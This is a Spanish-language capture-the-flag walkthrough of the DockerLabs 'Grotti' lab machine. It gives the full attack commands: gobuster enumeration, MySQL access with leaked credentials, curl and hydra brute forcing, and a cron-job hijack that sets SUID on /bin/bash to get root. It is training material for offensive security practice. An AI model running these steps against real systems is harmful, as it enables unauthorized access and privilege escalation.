---
title: "DockerLabs - Grotti"
difficulty: "Fácil"
source: "DockerLabs"
---

Máquina orientada a la enumeración web, explotación de bases de datos MySQL y escalada de privilegios.

## Despliegue

```bash
bash auto_deploy.sh grotti.tar
```

## Reconocimiento

```bash
nmap -sCV -p- 172.17.0.2
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,sql,zip,bak -t 50
```

Directorios relevantes encontrados:
- `/imagenes` — contiene la contraseña del usuario `rocket`
- `/secret` — panel con usuarios administradores y enlace para descargar credenciales MySQL en `.txt`

## Acceso a MySQL

```bash
mysql -u rocket -p -h 172.17.0.2 --ssl=0
```

Base de datos `file_secret`, tabla `rutas`:

| id | nombre | ruta |
|----|--------|------|
| 1 | imagenes | /var/www/html/files/imagenes/ |
| 4 | secret | /unprivate/secret |

## Fuerza bruta sobre generate.php

En `/unprivate/secret` hay un formulario POST con campos `content` y `number` (1-100). Se enumeran todos los valores:

```bash
for i in $(seq 1 100); do
  curl -s -X POST http://172.17.0.2/unprivate/secret/generate.php \
    -d "content=test&number=$i" -o "/tmp/grotti_$i.txt"
done
```

El número **16** devuelve un ZIP con una lista de contraseñas.

```bash
curl -s -X POST http://172.17.0.2/unprivate/secret/generate.php \
  -d "content=test&number=16" -o /tmp/grotti_16_raw
unzip /tmp/grotti_16_raw -d /tmp/grotti_passwords/
```

## Fuerza bruta SSH

```bash
hydra -l grooti -P /tmp/grotti_passwords/<wordlist> ssh://172.17.0.2 -t 4
# grooti:YoSoYgRoOt
```

```bash
ssh grooti@172.17.0.2
```

## Escalada de Privilegios — Cron Job Hijacking

```bash
find / -writable -type f \
  -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" \
  -not -path "/run/*" -not -path "/tmp/*" -not -path "/home/grooti/*" \
  2>/dev/null
```

Encontrado: `/tmp/malicious.sh` — script ejecutado periódicamente por root vía cron, escribible por `grooti`.

```bash
echo '#!/bin/bash
chmod u+s /bin/bash' > /tmp/malicious.sh
```

Cuando el cron lo ejecute:

```bash
/bin/bash -p
whoami  # root
```

## Conclusión

Cadena de ataque: enumeración web → MySQL → ZIP con contraseñas → hydra SSH → cron job hijacking → root.
